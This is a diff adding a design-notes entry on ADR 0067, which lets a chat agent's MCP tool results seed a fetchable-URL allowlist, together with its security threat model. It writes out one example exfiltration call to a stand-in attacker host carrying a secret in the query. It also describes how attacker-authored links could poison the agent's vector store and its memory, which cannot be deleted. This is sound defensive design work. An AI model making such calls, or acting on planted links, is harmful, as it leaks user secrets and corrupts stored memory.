@@ -214,6 +214,38 @@ to document a mechanical rule, add a lint rule instead.
   `ResponseHeadersRead` makes `HttpClient.Timeout` stop covering the body). No new secret, container, Bicep
   or `excludedPaths` change; `POST /api/conversations/{id}/documents/from-url` is noted as a follow-up and
   deliberately **not built**.
+- MCP tool results may seed the fetchable-URL allowlist (ADR 0067, **amends 0011 + 0066, extends 0024/0026**):
+  a **per-server opt-in** — `StoredMcpServer.SeedsFetchableUrls`, trailing `[Id(13)]`, default false, so every
+  existing server ships with it OFF and there is no migration — lets the URLs in that server's tool results
+  become fetchable by `fetch_web_page` and readable by `read_web_document`, without the user pasting them
+  back. The motivating case is the sibling repo's `find_links(url, filter)` → a PDF. **Three things about the
+  security position, in the order they are got wrong.** (1) **Exfiltration through MCP is ALREADY open and
+  this does not create it** — `BuildAgent` gates MCP tools by selection key only, never by argument, so
+  `find_links("https://attacker.example/?q=<secret>")` was always possible (ADR 0024); do not write this up as
+  opening a channel. (2) What it DOES add is **durable inbound poisoning with a laundering step**:
+  attacker-authored hrefs become ingestible by `read_web_document`, which writes vector chunks and — through
+  ADR 0056 — can be retained into a memory bank with **no delete path**. (3) The sharpest and most easily
+  missed: **our own managed-identity-bearing container now dials attacker-authored URLs**, so this amends
+  **ADR 0066's** threat model, not 0011's alone (0066 already recorded that an `excludedPaths` API-key holder
+  could do it; this is a second, **model-facing** door), and `PrivateAddressGuard` is **no** substitute — it
+  permits every public address by construction. "User-invoked" is not a distinguishable state and must not be
+  designed around. The seeds go in a **separate** `[Id(13)] SeededFetchableUrls` with **two** caps
+  (`MaxSeededUrlsPerResult = 20`, `MaxSeededFetchableUrls = 100`): harvesting into the 50-entry
+  `FetchableUrls` would let one link-heavy scrape **silently evict every URL the user typed**, and without the
+  per-result cap an 8 KB result (150–250 URLs) reproduces that defect one level down. **The split is not pure
+  upside** — a poisoned seed is now *harder* to flush, since only other seeds evict it and there is no revoke
+  path. The harvest lives in the **grain** (`UrlHarvestingMcpTool`, wrapped in `BuildAgent` via an extracted
+  helper for S3776 headroom), never in the Backend's `TruncatingMcpTool`, because that wrapper's instances are
+  shared across every conversation of a user while the lists are per-conversation. Four mechanics traps and the
+  four-times-told prohibition are in gotchas; the headline one is that **the rule the model actually reads is in
+  the TOOL DESCRIPTIONS** (six surfaces, in the JSON schema every turn), not `SKILL.md` — update only the skill
+  and a compliant model declines to use a seeded URL while every test passes. The flag is a **setting**, so it
+  rides `ToStored` and must **never** gain a `Keep` clause (the opposite of `KnownToolNames`) or it could not be
+  turned off. No new secret, container, Cosmos container, Bicep or `excludedPaths` change, and no package.
+  Shell cache bumped `agent42-shell-v32` → `-v33`. DevHost needed changes of its own to make the feature
+  exercisable at all (a `demo_find_links` tool, the seeding flag on the offline group, and a two-call chain in
+  `CannedChatClient`); the offline leg **was** run — including an A/B on the flag and a UI untick/re-tick
+  round-trip — and ADR 0067 records the measured values.
 - User location (ADR 0012): a `get_current_location` tool returning the user's coordinates and a
   reverse-geocoded street address. `navigator.geolocation` is a *browser* API and tools run server-side,
   and the chat path is a one-way NDJSON stream — so a tool cannot ask the browser for a fix mid-turn. The
